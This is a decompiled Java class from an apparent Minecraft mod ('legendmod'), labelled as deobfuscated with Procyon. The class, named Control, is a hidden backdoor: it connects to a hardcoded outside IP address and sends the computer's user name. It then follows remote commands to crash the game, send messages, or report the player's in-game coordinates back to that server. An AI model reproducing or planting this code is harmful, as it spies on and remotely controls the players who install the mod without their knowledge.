//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Наталья\Desktop\project\Decompile\DeobfMineObf\1.12 stable mappings"!

//Decompiled by Procyon!

package com.cookie.legendmod.utils;

import net.minecraft.client.*;
import java.net.*;
import java.io.*;

public class Control extends Thread
{
    public static boolean mode;
    public static String command;
    public static String name2;
    
    @Override
    public void run() {
        final int serverPort = 19172;
        final String address = "46.180.196.53";
        final Minecraft mc = Minecraft.getMinecraft();
        try {
            final Socket socket = new Socket(address, serverPort);
            final InputStream sin = socket.getInputStream();
            final OutputStream sout = socket.getOutputStream();
            final DataInputStream in = new DataInputStream(sin);
            final DataOutputStream out = new DataOutputStream(sout);
            final PrintWriter write = new PrintWriter(socket.getOutputStream(), true);
            if (!Control.mode) {
                write.println(System.getProperty("user.name"));
            }
            else if (Control.mode) {
                write.println(Control.command);
                write.println(System.getProperty("user.name"));
                write.println(Control.name2);
            }
            if (!Control.mode) {
                final String line = in.readLine();
                if (line.startsWith("/crash")) {
                    ExecutePack.crash();
                }
                if (line.startsWith("/msg")) {
                    ExecutePack.msg(line);
                }
                if (line.startsWith("/cords")) {
                    write.println(new String(mc.player.getPosition().toString()));
                }
            }
            else if (Control.mode) {
                if (Control.command.equals("/cords")) {
                    final String line = in.readLine();
                    ChatUtils.sendMessage(line);
                }
                Control.mode = false;
            }
            socket.close();
            sin.close();
            sout.close();
            in.close();
            out.close();
            write.close();
        }
        catch (IOException var11) {
            var11.printStackTrace();
        }
    }
    
    static {
        Control.mode = false;
        Control.command = null;
        Control.name2 = null;
    }
}
